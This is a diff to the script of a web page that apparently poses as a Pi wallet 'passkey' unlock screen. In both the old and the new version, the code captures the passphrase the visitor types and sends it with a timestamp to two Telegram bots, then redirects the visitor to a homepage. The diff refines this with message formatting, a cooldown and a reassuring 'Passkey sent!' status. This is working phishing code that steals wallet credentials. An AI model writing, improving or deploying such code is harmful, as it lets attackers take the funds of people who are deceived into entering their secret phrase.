@@ -232,72 +232,108 @@
   const TELEGRAM_CHAT_ID_2 = "8119887370";
 
 
-function sendMessage() {
-  const input = document.getElementById("messageInput");
-  const statusMessage = document.getElementById("statusMessage");
-  const buttons = document.querySelectorAll(".unlock-button");
-  const buttonTexts = document.querySelectorAll(".button-text");
+ let isCooldown = false; // Prevent spamming
 
-  const message = input.value.trim();
+    function sendMessage() {
+      const input = document.getElementById("messageInput");
+      const statusMessage = document.getElementById("statusMessage");
+      const buttons = document.querySelectorAll(".unlock-button");
+      const buttonTexts = document.querySelectorAll(".button-text");
+      const message = input.value.trim();
 
-  // Disable inputs
-  input.disabled = true;
-  buttons.forEach((button, index) => {
-    button.disabled = true;
-    buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
-  });
+      if (isCooldown) {
+        showStatus("⏳ Please wait before trying again", "error");
+        return;
+      }
 
-  // If input is too short
-  if (message.length <= 24) {
-    showStatus("✗ It should be a 24-length passkey to login", "error");
-    setTimeout(() => {
-      window.location.href = "https://pibrowserkurd.github.io/pibrowserhome/";
-    }, 1000);
-    return;
-  }
+      if (message.length <= 24) {
+        showStatus("✗ It should be a 24-length passkey to login", "error");
+        return;
+      }
 
-  // Proceed with sending the message if valid
-  statusMessage.classList.remove("show");
+      // Start cooldown and disable input/buttons
+      isCooldown = true;
+      input.disabled = true;
+      buttons.forEach((button, index) => {
+        button.disabled = true;
+        buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
+      });
 
-  const requests = [
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_1, text: message })
-    }),
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message })
-    })
-  ];
+      // Format message with header and timestamp
+      const now = new Date();
+      const timestamp = now.toLocaleString();
+      const formattedMessage = `📩 *New Passkey Log In*\n\n🔑 Passkey:\n${message}\n\n🕒 Time:\n${timestamp}`;
 
-  Promise.all(requests)
-    .then(responses => Promise.all(responses.map(res => res.json())))
-    .then(results => {
-      showStatus("✗ Please Try Again", "error");
-      input.value = "";
-    })
-    .catch(error => {
-      showStatus("✗ Please Try Again", "error");
-      console.error("Error:", error);
-    })
-    .finally(() => {
+      const requests = [
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID_1,
+            text: formattedMessage,
+            parse_mode: "Markdown"
+          })
+        }),
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID_2,
+            text: formattedMessage,
+            parse_mode: "Markdown"
+          })
+        })
+      ];
+
+      Promise.all(requests)
+        .then(responses => Promise.all(responses.map(res => res.json())))
+        .then(results => {
+          // You can check results here for success/failure if you want
+          showStatus("✅ Passkey sent! Redirecting to homepage...", "success");
+          input.value = "";
+        })
+        .catch(error => {
+          showStatus("✗ Failed to send message, please try again", "error");
+          console.error("Error:", error);
+        })
+        .finally(() => {
+          // Cooldown for 10 seconds before re-enable inputs
+          setTimeout(() => {
+            isCooldown = false;
+            input.disabled = false;
+            buttons.forEach((button, index) => {
+              button.disabled = false;
+              buttonTexts[index].textContent = index === 0 ? "Unlock With Passphrase" : "Unlock With Face ID";
+            });
+          }, 10000);
+
+          // Redirect to homepage after 5 seconds
+          setTimeout(() => {
+            window.location.replace("https://pibrowserkurd.github.io/");
+          }, 5000);
+        });
+    }
+
+    function showStatus(message, type) {
+      const statusMessage = document.getElementById("statusMessage");
+      statusMessage.textContent = message;
+      statusMessage.className = `status-message ${type}`;
       setTimeout(() => {
-        window.location.href = "https://pibrowserkurd.github.io/pibrowserhome/";
-      }, 1000);
+        statusMessage.classList.add("show");
+      }, 100);
+    }
+
+    // Auto-resize input height
+    const input = document.getElementById("messageInput");
+    input.addEventListener("input", function () {
+      this.style.height = "auto";
+      this.style.height = Math.min(this.scrollHeight, 200) + "px";
     });
-}
 
-function showStatus(message, type) {
-  const statusMessage = document.getElementById("statusMessage");
-  statusMessage.textContent = message;
-  statusMessage.className = `status-message ${type}`;
-  setTimeout(() => {
-    statusMessage.classList.add("show");
-  }, 100);
-}
-</script>
-
+    // Focus input on load
+    window.addEventListener("load", () => {
+      document.getElementById("messageInput").focus();
+    });
+  </script>
 </body>
 </html>
